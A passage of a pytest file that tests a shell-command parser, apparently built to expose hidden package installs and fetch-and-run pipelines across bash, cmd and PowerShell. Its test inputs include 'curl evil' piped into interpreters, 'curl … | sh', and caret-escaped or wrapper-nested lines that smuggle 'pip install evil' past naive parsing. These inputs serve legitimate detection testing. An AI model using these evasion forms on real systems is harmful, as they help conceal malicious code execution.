    find("flock -c 'npm i x' /l", ["npm", "i", "x"])


@pytest.mark.parametrize(
    "line",
    ['@start "t" npm i evil', 'cmd /c "start "t" npm i evil"', '@cmd /c start "t" npm i evil'],
)
def test_cmd_start_title_with_at_and_outer_quotes(line: str) -> None:
    got = argvs(line, "cmd")
    assert ["npm", "i", "evil"] in got, got
    assert not any(a and a[0] == "t" for a in got)


def test_cmd_outer_quote_rule() -> None:
    find('cmd /c "npm i x"', ["npm", "i", "x"], "cmd")
    find('cmd /s /c "npm i x & pip install y"', ["pip", "install", "y"], "cmd")


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("parallel npm i ::: evil", "bash"),
        ("parallel -j4 npm i {} ::: evil other", "bash"),
        ("parallel ::: 'npm i evil'", "bash"),
        ("echo 'npm i evil' | parallel", "bash"),
    ],
)
def test_parallel_jobs_are_commands(line: str, shell_: str) -> None:
    find(line, ["npm", "i", "evil"], shell_)


def test_sg_without_dash_c_runs_its_command() -> None:
    find("sg grp 'npm i x'", ["npm", "i", "x"])
    find("sg - grp 'npm i x'", ["npm", "i", "x"])


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("cmd.exe/c npm i x", "cmd"),
        ("cmd/s/c npm i x", "cmd"),
        ("cmd /s/c npm i x", "cmd"),
        ("CMD.EXE /S/C npm i x", "cmd"),
        ("cmd /q /d/c npm i x", "cmd"),
        ("C:\\Windows\\System32\\cmd.exe/c npm i x", "cmd"),
        ("cmd.exe/c npm i x", "powershell"),
    ],
)
def test_cmd_glued_switches(line: str, shell_: str) -> None:
    find(line, ["npm", "i", "x"], shell_)


def test_firejail_options_with_values_and_cd_dash() -> None:
    find("firejail --profile x npm i x", ["npm", "i", "x"])
    find("firejail --profile=x --net=none npm i x", ["npm", "i", "x"])
    find("firejail --private npm i x", ["npm", "i", "x"])


# --- fix round 3 ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    "line, shell_, inner",
    [
        ("cmd/sh -c 'npm i evil'", "bash", ["npm", "i", "evil"]),
        ("/tmp/cmd/sudo npm i evil", "bash", ["npm", "i", "evil"]),
        ("./cmd/env npm i evil", "bash", ["npm", "i", "evil"]),
        ("cmd/bash -c 'npm i evil'", "bash", ["npm", "i", "evil"]),
        ("C:/x/cmd/pwsh -c 'npm i evil'", "bash", ["npm", "i", "evil"]),
        ("C:/x/cmd/powershell.exe -c 'npm i evil'", "bash", ["npm", "i", "evil"]),
    ],
)
def test_cmd_folder_in_path_does_not_disable_unwrapping(line: str, shell_: str, inner: list) -> None:
    find(line, inner, shell_)


def test_cmd_folder_noise_is_not_mangled() -> None:
    got = argvs("cmd/kitty npm", "bash")
    assert ["itty", "npm"] not in got  # the old /k-switch bug
    assert got == [["cmd/kitty", "npm"]]


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("cmd /c npm ^& pip install evil", "cmd"),
        ("cmd /c echo hi ^&^& pip install evil", "cmd"),
        ("cmd /c echo ^& pip install evil", "cmd"),
        ("start cmd /c echo ^& pip install evil", "cmd"),
        ("call cmd /c npm ^& pip install evil", "cmd"),
        ("cmd/c echo ^& pip install evil", "cmd"),
        ("cmd /c cmd /c echo ^^^& pip install evil", "cmd"),
        ("cmd.exe /c 'cmd /c npm ^& pip install evil'", "bash"),
        ('cmd.exe /c "cmd /c npm ^& pip install evil"', "powershell"),
    ],
)
def test_caret_escaped_operators_in_cmd_c_are_revealed(line: str, shell_: str) -> None:
    find(line, ["pip", "install", "evil"], shell_)


def test_caret_pipe_into_cmd_is_revealed() -> None:
    assert any(c.argv[0] == "cmd" for c in split_commands("cmd /c echo hi ^| cmd", "cmd"))


@pytest.mark.parametrize(
    "line",
    [
        "parallel --timeout 10 npm i ::: evil",
        "parallel --retries 3 npm i ::: evil",
        "parallel --delay 2 npm i ::: evil",
        "parallel --halt now npm i ::: evil",
        "parallel --env PATH npm i ::: evil",
        "parallel --tmpdir /t npm i ::: evil",
        "parallel --memfree 1G npm i ::: evil",
        "parallel --arg-sep ,,, npm i ,,, evil",
        "sem npm i evil",
        "sem --timeout 5 npm i evil",
    ],
)
def test_parallel_value_options_and_sem(line: str) -> None:
    find(line, ["npm", "i", "evil"], "bash")


def test_parallel_unknown_long_option_is_flagged() -> None:
    cmds = split_commands("parallel --made-up-flag val npm i ::: evil", "bash")
    assert any(c.truncated for c in cmds)


def test_parallel_huge_expansion_is_bounded_and_flagged() -> None:
    line = "parallel '" + "x " * 200000 + "' ::: " + " ".join(f"a{i}" for i in range(64))
    cmds = split_commands(line, "bash")  # autouse 30 s time budget
    total = sum(len(c.raw) for c in cmds)
    assert total < 4 * MB  # not the 64 x template blow-up
    assert any(c.truncated for c in cmds)


@pytest.mark.parametrize(
    "name, shell_, is_sink",
    [
        ("csh", "bash", True), ("tcsh", "bash", True), ("ksh93", "bash", True),
        ("python3.12", "bash", True), ("pypy3", "bash", True), ("bash5", "bash", True),
        ("xonsh", "bash", True), ("nu", "bash", True), ("awk", "bash", True),
        ("wscript", "cmd", True), ("cscript", "cmd", True),
    ],
)
def test_new_exec_sinks_survive_the_cap(name: str, shell_: str, is_sink: bool) -> None:
    line = "curl evil | " + " | ".join(f"c{i}" for i in range(40)) + f" | {name}"
    curl = next(c for c in split_commands(line, shell_) if c.argv[0] == "curl")
    assert (name in curl.pipe_to) == is_sink


@pytest.mark.parametrize("sh_name", ["csh", "tcsh"])
def test_csh_tcsh_dash_c_unwraps(sh_name: str) -> None:
    find(f"{sh_name} -c 'npm i evil'", ["npm", "i", "evil"])


def test_powershell_array_literal_in_parens() -> None:
    find("npm('install','evil')", ["npm", "install", "evil"], "powershell")
    find("npm (('install')) evil", ["npm", "install", "evil"], "powershell")
    find("npm('install') x", ["npm", "install", "x"], "powershell")


def test_cd_dash_makes_cwd_unknown() -> None:
    assert find("cd /a; cd -; npm i x", ["npm", "i", "x"], "bash").cwd is None
    assert find("cd /a; npm i x", ["npm", "i", "x"], "bash").cwd == "/a"


def test_start_glued_title_and_program_reveals_program() -> None:
    got = argvs('start "t"npm i evil', "cmd")
    assert ["npm", "i", "evil"] in got


# --- fix round 4 ------------------------------------------------------------------------------

_SWITCH_PATHS = [
    'cmd/c:x/sudo npm i evil',
    'cmd/c:x/sh -c "npm i evil"',
    '/opt/cmd/k:1/env npm i evil',
    './cmd/c:/sudo npm i evil',
    'cmd/r:/bin/sh -c "npm i evil"',
    'cmd/q/k:z/bash -c "npm i evil"',
]


@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
@pytest.mark.parametrize("line", _SWITCH_PATHS)
def test_cmd_switch_values_never_swallow_a_path(line: str, shell_: str) -> None:
    find(line, ["npm", "i", "evil"], shell_)


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("echo npm i evil | cmd/q", "cmd"),
        ("echo npm i evil | cmd/d/q", "cmd"),
        ("echo npm i evil| cmd/a", "cmd"),
        ("echo npm i evil | cmd.exe/v:on", "powershell"),
        ("echo npm i evil | cmd.exe/q", "bash"),
        ("echo npm i evil | cmd/q", "bash"),  # bash: a path `cmd/q` or cmd /q -> both readings
    ],
)
def test_glued_cmd_switches_without_c_still_read_stdin(line: str, shell_: str) -> None:
    cmds = split_commands(line, shell_)
    assert ["npm", "i", "evil"] in [c.argv for c in cmds], [c.argv for c in cmds]
    echo = next(c for c in cmds if c.argv[0] == "echo")
    assert echo.pipe_to and echo.pipe_to[0].lower().startswith("cmd")
    # the glued program is still emitted as written (the path reading)
    assert any(c.argv[0].lower().startswith("cmd") for c in cmds)


def test_cmd_caret_layer_is_removed_before_the_outer_quote_rule() -> None:
    find('cmd /c ^"x ^& pip install evil^"', ["pip", "install", "evil"], "cmd")
    find('cmd /c "npm i x"', ["npm", "i", "x"], "cmd")  # plain outer quotes unchanged


@pytest.mark.parametrize("line", ["cmd /c (npm ^& pip install evil)", "cmd /c x (npm ^& pip install evil)"])
def test_cmd_c_takes_parentheses_as_part_of_the_child_command_line(line: str) -> None:
    find(line, ["pip", "install", "evil"], "cmd")


def test_cmd_blocks_still_group() -> None:
    find("if not exist node_modules (npm i x) else (pip install y)", ["pip", "install", "y"], "cmd")
    assert argvs("(npm i x & pip install y)", "cmd") == [["npm", "i", "x"], ["pip", "install", "y"]]


@pytest.mark.parametrize(
    "line",
    [
        "Start-Process cmd -ArgumentList '/c echo ^\"x & pip install evil'",
        "Start-Process cmd '/c echo ^\"x & pip install evil'",
        "cmd /c 'echo ^\"x & pip install evil^\"'",
    ],
)
def test_caret_quote_does_not_open_quoting_for_cmd_from_powershell(line: str) -> None:
    _runs_pip_evil(line, "powershell")


def test_caret_quote_from_bash_into_cmd() -> None:
    _runs_pip_evil("cmd.exe /c 'echo ^\"x & pip install evil^\"'", "bash")


def _runs_pip_evil(line: str, shell_: str) -> None:
    # `evil^"` is the word `evil"` for the child cmd (a literal quote), so compare the start only
    got = argvs(line, shell_)
    assert any(a[:2] == ["pip", "install"] and a[2].startswith("evil") for a in got), got


def test_env_is_shared_between_commands_not_copied() -> None:
    line = "export " + " ".join(f"V{i}=x" for i in range(64)) + "; " + "".join(f"a{k};" for k in range(5000))
    cmds = split_commands(line, "bash")
    assert len(cmds) == 5001 and not cmds.budget_exceeded
    assert len({id(c.env) for c in cmds[1:]}) == 1  # one mapping per env state
    assert cmds[-1].env["V63"] == "x"
    with pytest.raises(TypeError):
        cmds[-1].env["X"] = "y"  # read only: it is shared


def test_env_shared_by_many_commands_stays_bounded() -> None:
    # was 1.17 s and 1.47 GB unflagged: every Cmd copied the 64-entry env and dedup sorted it
    line = "export " + " ".join(f"V{i}=x" for i in range(64)) + "; " + "".join(f"a{k};" for k in range(199000))
    assert len(line) > 1_400_000
    start = time.perf_counter()
    cmds = split_commands(line, "bash")
    elapsed = time.perf_counter() - start
    assert len({id(c.env) for c in cmds}) <= 2  # the empty state and the exported one
    assert ["a0"] in [c.argv for c in cmds[:3]]
    assert elapsed < CAP, f"{elapsed:.3f}s"


@pytest.mark.parametrize("unit", ["A{k}=1 a;", "export V1={k}; a;"])
def test_env_states_count_toward_the_work_budget(unit: str) -> None:
    # each command has its own env state on top of 64 exported variables: copies are work
    line = "export " + " ".join(f"V{i}=x" for i in range(64)) + "; npm i x; "
    line += "".join(unit.replace("{k}", str(k)) for k in range(150000))
    start = time.perf_counter()
    cmds = split_commands(line, "bash")
    elapsed = time.perf_counter() - start
    assert cmds.budget_exceeded and cmds[-1].raw.startswith(BUDGET_EXCEEDED)
    assert find(line, ["npm", "i", "x"]).env["V63"] == "x"
    assert elapsed < CAP, f"{elapsed:.3f}s"


def test_env_differs_by_assignment_still_split_and_equal_envs_merge() -> None:
    cmds = [c for c in split_commands("A=1 npm i x; A=1 npm i x; A=2 npm i x", "bash") if c.argv == ["npm", "i", "x"]]
    assert sorted(c.env["A"] for c in cmds) == ["1", "2"]


@pytest.mark.parametrize("shell_, sep", [("bash", ";"), ("powershell", ";"), ("cmd", "&")])
def test_time_cut_keeps_what_was_parsed_before_it(monkeypatch: pytest.MonkeyPatch, shell_: str, sep: str) -> None:
    import engine.parse as parse

    monkeypatch.setattr(parse, "_MAX_SECONDS", 0.02)
    line = f"npm i x{sep} echo " + "y " * 2_000_000
    start = time.perf_counter()
    cmds = split_commands(line, shell_)
    elapsed = time.perf_counter() - start
    assert cmds.budget_exceeded
    assert ["npm", "i", "x"] in [c.argv for c in cmds]
    assert cmds[-1].raw.startswith(BUDGET_EXCEEDED)
    assert elapsed < 1.0 + parse._MAX_SECONDS, f"{elapsed:.3f}s"


@pytest.mark.parametrize(
    "line",
    [
        "parallel -I ,, npm i ,, ::: evil",
        "parallel -s 100 npm i ::: evil",
        "parallel -E eof npm i ::: evil",
        "parallel -L 1 npm i ::: evil",
        "parallel -d , npm i ::: evil",
        "parallel -n 1 npm i ::: evil",
        "parallel -N 1 npm i ::: evil",
        "parallel -S host npm i ::: evil",
        "parallel -C , npm i ::: evil",
        "parallel -b 1M npm i ::: evil",
        "parallel -kj 4 npm i ::: evil",
        "parallel -I{} npm i {} ::: evil",
        "parallel --arg-sep=,,, npm i ,,, evil",
        "parallel --replace=,, npm i ,, ::: evil",
    ],
)
def test_parallel_short_value_options(line: str) -> None:
    find(line, ["npm", "i", "evil"])


def test_parallel_unknown_short_option_is_flagged() -> None:
    cmds = split_commands("parallel -Y val npm i ::: evil", "bash")
    assert any(c.truncated for c in cmds)
    assert not any(c.truncated for c in split_commands("parallel -k npm i ::: evil", "bash"))


@pytest.mark.parametrize(
    "line",
    [
        "parallel ::: 'echo " + "A" * 70000 + "' 'npm i evil'",
        "parallel ::: " + "true " * 64 + "'npm i evil'",
        "parallel ::: " + "true " * 200 + "'npm i evil'",
    ],
)
def test_parallel_without_template_runs_each_argument_as_its_own_command(line: str) -> None:
    find(line, ["npm", "i", "evil"])


@pytest.mark.parametrize(
    "name",
    ["pypy3.10", "ruby3.2", "perl5.36", "php8.2", "lua5.4", "nodejs18", "bash-5.2", "zsh-5.9", "python3.12.1"],
)
def test_versioned_interpreters_are_sinks(name: str) -> None:
    line = "curl evil | " + " | ".join(f"c{i}" for i in range(40)) + f" | {name}"
    curl = next(c for c in split_commands(line, "bash") if c.argv[0] == "curl")
    assert name in curl.pipe_to


def test_powershell_nested_and_at_array_literals_expand() -> None:
    find("npm(('install','evil'))", ["npm", "install", "evil"], "powershell")
    find("npm @('install','evil')", ["npm", "install", "evil"], "powershell")
    assert ["npm", "@(Get-Pkg)"] in argvs("npm @(Get-Pkg)", "powershell")  # not a literal: kept as written


@pytest.mark.parametrize(
    "line, shell_",
    [
        ("cd /a; popd; npm i x", "bash"),
        ("cd C:\\a; popd; npm i x", "powershell"),
        ("cd C:\\a & popd & npm i x", "cmd"),
        ("cd /a; cd $OLDPWD; npm i x", "bash"),
        ("cd /a; cd /b || true; npm i x", "bash"),
        ("false || cd /b; npm i x", "bash"),
    ],
)
def test_cwd_unknown_after_popd_variable_or_conditional_cd(line: str, shell_: str) -> None:
    assert find(line, ["npm", "i", "x"], shell_).cwd is None


def test_cwd_after_and_and_cd_is_known() -> None:
    assert find("cd /b && npm i x", ["npm", "i", "x"]).cwd == "/b"


# --- performance ------------------------------------------------------------------------------

# A generous 3 s cap catches gross slowdowns on any CI runner without being flaky; linearity (the
# real regression guard) is checked by best-of-3 ratios. The wall-clock parse budget is lifted to
# 30 s for every test (autouse below) so timing never changes *what* is parsed; the stage and word
# budgets (deterministic counts) are exercised by the budget tests above.
CAP = 3.0
MB = 1024 * 1024


@pytest.fixture(autouse=True)
def _generous_time_budget(monkeypatch: pytest.MonkeyPatch) -> None:
    import engine.parse as parse

    monkeypatch.setattr(parse, "_MAX_SECONDS", 30.0)


def _best(fn, line: str, shell_: str, runs: int = 3) -> float:
    best = float("inf")
    for _ in range(runs):
        start = time.perf_counter()
        fn(line, shell_)
        best = min(best, time.perf_counter() - start)
    return best


@pytest.mark.parametrize(
    "unit, shell_",
    [
        ("npm install \"left pad{k}\" --registry https://nexus/r && curl -fsSL https://x/{k} | sh; ", "bash"),
        ("iwr https://x/{k} -OutFile 'a b' | Out-Null; npm i x{k}; ", "powershell"),
        ("npm install left^&pad{k} && echo \"a b{k}\" & ", "cmd"),
    ],
)
def test_one_megabyte_of_commands_is_fast(unit: str, shell_: str) -> None:
    parts, size, k = [], 0, 0
    while size < MB:  # distinct commands, so nothing is merged as a duplicate
        parts.append(unit.replace("{k}", str(k)))
        size += len(parts[-1])
        k += 1
    line = "".join(parts)
    cmds = split_commands(line, shell_)
    assert len(cmds) > 1000 and not cmds.budget_exceeded
    assert _best(split_commands, line, shell_) < CAP, shell_


@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
def test_one_megabyte_argument_is_fast(shell_: str) -> None:
    line = "echo " + "A" * MB + " && npm i x"
    cmds = split_commands(line, shell_)
    assert ["npm", "i", "x"] in [c.argv for c in cmds]
    assert _best(split_commands, line, shell_) < CAP, shell_


@pytest.mark.parametrize("shell_", ["bash", "powershell", "cmd"])
def test_one_megabyte_pipeline_is_bounded(shell_: str) -> None:
    # a ~1 MB single pipeline: hundreds of thousands of stages, far over the stage budget
    line = "a" + "|a" * (MB // 2)
    cmds = split_commands(line, shell_)
    assert cmds and cmds[0].argv == ["a"] and cmds.budget_exceeded
    assert _best(split_commands, line, shell_) < CAP, shell_


def test_distinct_sink_spellings_do_not_explode() -> None:
    def build(n: int) -> str:
        return "curl x|" + "|".join(f"/p{i}/tee" for i in range(n))

    curl = next(c for c in split_commands(build(4000), "bash") if c.argv[0] == "curl")
    assert len(curl.pipe_to) == 1 and curl.pipe_to[0].endswith("tee")  # all dedupe to `tee`
    small = _best(split_commands, build(4000), "bash")
    big = _best(split_commands, build(16000), "bash")
    assert big < small * 8, f"small={small:.3f}s big={big:.3f}s"  # linear, not quadratic
    assert big < CAP


def test_pipeline_time_scales_linearly() -> None:
    def line(stages: int) -> str:
        return "a" + "|a" * stages

    _best(split_commands, line(20000), "bash", runs=1)  # warm up
    small = _best(split_commands, line(40000), "bash")
    big = _best(split_commands, line(160000), "bash")
    assert big < small * 8, f"small={small:.3f}s big={big:.3f}s"  # 4x work, far under quadratic's 16x


@pytest.mark.parametrize("shell_, unit", [("bash", "a{k};"), ("powershell", "a{k};"), ("cmd", "a{k}&")])
def test_one_megabyte_of_tiny_commands_is_bounded(shell_: str, unit: str) -> None:
    parts, size, k = [], 0, 0
    while size < MB:
        parts.append(unit.replace("{k}", str(k)))
        size += len(parts[-1])
        k += 1
    line = "".join(parts)
    cmds = split_commands(line, shell_)
    assert len(cmds) == k and not cmds.budget_exceeded  # ~150k stages is under the 200k budget
    assert _best(split_commands, line, shell_) < CAP, shell_


def test_many_heredocs_stay_fast() -> None:
    line = "".join(f"cat <<E{k}\nnpm i x\nE{k}\n" for k in range(60000)) + "pip install y"
    cmds = split_commands(line, "bash")
    assert len(cmds) == 60001 and cmds[-1].argv == ["pip", "install", "y"]
    assert _best(split_commands, line, "bash") < CAP


def test_many_env_assignments_stay_fast() -> None:
    line = "".join(f"export V{i}=x; true; " for i in range(40000)) + "npm i x"
    cmds = split_commands(line, "bash")
    assert cmds[-1].argv == ["npm", "i", "x"]
    assert _best(split_commands, line, "bash") < CAP


def test_realistic_one_megabyte_parses_under_one_second() -> None:
    # spec check: a realistic 1 MB input parses under 1 s on CI (the brief's 200 ms is local, informational)
    unit = "npm install \"left pad{k}\" --registry https://nexus/r && curl -fsSL https://x/{k} | sh; "
    parts, size, k = [], 0, 0
    while size < MB:
        parts.append(unit.replace("{k}", str(k)))
        size += len(parts[-1])
        k += 1
    line = "".join(parts)
    elapsed = _best(split_commands, line, "bash")
    print(f"realistic 1 MB bash parse: {elapsed * 1000:.0f} ms (brief: 200 ms locally, informational)")
    assert elapsed < 1.0, f"{elapsed:.3f}s"
